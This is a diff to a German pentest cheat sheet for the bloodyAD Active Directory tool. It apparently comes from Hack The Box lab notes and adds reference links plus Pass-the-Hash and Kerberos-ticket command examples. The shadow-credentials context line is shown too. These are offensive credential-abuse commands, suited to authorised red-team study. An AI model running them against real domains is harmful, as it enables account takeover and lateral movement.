@@ -7,6 +7,14 @@ Mit bloodyAD lassen sich u. a. Benutzer- und Gruppeninformationen auslesen, Be
 
 Im Unterschied zu reinen Abfrage-Tools bietet bloodyAD umfassende Schreib- und Kontrollmöglichkeiten – ideal für Red Teaming und Post-Exploitation-Szenarien. Dabei bleibt es CLI-basiert, leichtgewichtig und präzise steuerbar.
 
+## weiterführende Informationen
+
+https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
+
+https://www.thehacker.recipes/
+
+<br>
+
 ## Inhaltsverzeichnis
 
 - [Retrieve Domain Information](#-retrieve-domain-information)
@@ -23,6 +31,8 @@ Im Unterschied zu reinen Abfrage-Tools bietet bloodyAD umfassende Schreib- und K
 - [ReadGMSAPassword](#-readgmsapassword)
 - [Modify UPN](#-modify-upn)
 - [Shadow Credentials](#-shadow-credentials)
+- [Pass-The-Hash](#-pass-the-hash)
+- [Kerberos Ticket](#-kerberos-ticket)
 
 <br>
 
@@ -155,5 +165,23 @@ Fügt dem AD-Benutzer joerg sogenannte Shadow Credentials hinzu, die alternative
 ```zsh
 bloodyAD --host $IP -d b2syn.htb -u admin -p 'Passw0rd!' add shadowCredentials "CN=joerg,OU=Users,DC=b2syn,DC=htb"
 ```
+
+<br>
+
+### 🧩 Pass-the-Hash
+
+```zsh
+bloodyAD --host <IP> -d <DOMAIN> -u <USER> -p :aad3b435b51404eeaad3b435b51404ee:5f2d3e5f9989f59a6e94cf08a823b2f2 -f rc4
+```
+
+<br>
+
+### 🧩 Kerberos-Ticket
+
+```zsh
+export KRB5CCNAME=/tmp/krb5cc_0
+bloodyAD --host <IP> -d <DOMAIN> -k -f aes256
+```
+
 
 
